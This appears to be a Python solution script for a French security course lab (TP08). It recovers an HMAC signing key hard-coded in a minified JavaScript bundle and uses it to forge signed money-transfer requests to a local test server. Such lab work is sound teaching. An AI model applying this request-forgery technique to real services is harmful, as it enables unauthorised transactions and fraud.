#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TP08 - travail de groupe (/tp08/tp/) : forger une requete signee, sans navigateur.

Analyse statique de tp/signer.min.js :
  - cle : derivee d'un tableau de morceaux base64 inverses puis decodes (deriveKey()).
  - message signe : "<timestamp>|POST|<chemin>|<sha256 hex du corps JSON>"
  - signature : HMAC-SHA256(cle, message), encodee en base64 (pas en hexadecimal).
  - en-tetes : X-Req-Ts (timestamp), X-Req-Sig (signature).
  - tolerance temporelle : +/- 30 s (timestamp Unix en secondes).

Aucune cle secrete cote serveur n'est utilisee ici : tout vient du code client,
lu dans le bundle (deriveKey, sha256hex, sign, send).
"""

import base64
import hashlib
import hmac
import json
import sys
import time
import urllib.error
import urllib.request

BASE_URL = "http://127.0.0.1:8000"
PATH = "/api/tp08/v2/transfer"

# _k inverse puis joint puis decode en base64 (cf. signer.min.js : deriveKey)
_K = ["MWU=", "N2M0", "M3lf", "bl9r", "czFn", "djJf"]
KEY = base64.b64decode("".join(reversed(_K))).decode()


def sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def sign(message: str) -> str:
    digest = hmac.new(KEY.encode(), message.encode(), hashlib.sha256).digest()
    return base64.b64encode(digest).decode()


def forge_transfer(to: str, amount: float) -> dict:
    body_obj = {"to": to, "amount": amount}
    body = json.dumps(body_obj, separators=(",", ":"))
    ts = str(int(time.time()))
    message = "|".join([ts, "POST", PATH, sha256_hex(body.encode())])
    signature = sign(message)

    req = urllib.request.Request(
        BASE_URL + PATH,
        data=body.encode(),
        method="POST",
        headers={
            "Content-Type": "application/json",
            "X-Req-Ts": ts,
            "X-Req-Sig": signature,
        },
    )
    try:
        with urllib.request.urlopen(req) as resp:
            return {"status": resp.status, "body": resp.read().decode()}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "body": e.read().decode()}


if __name__ == "__main__":
    to = sys.argv[1] if len(sys.argv) > 1 else "FR76-DEMO-0001"
    amount = float(sys.argv[2]) if len(sys.argv) > 2 else 42

    print(f"Cle deduite      : {KEY}")
    result = forge_transfer(to, amount)
    print(f"Statut HTTP      : {result['status']}")
    print(f"Corps de reponse : {result['body']}")
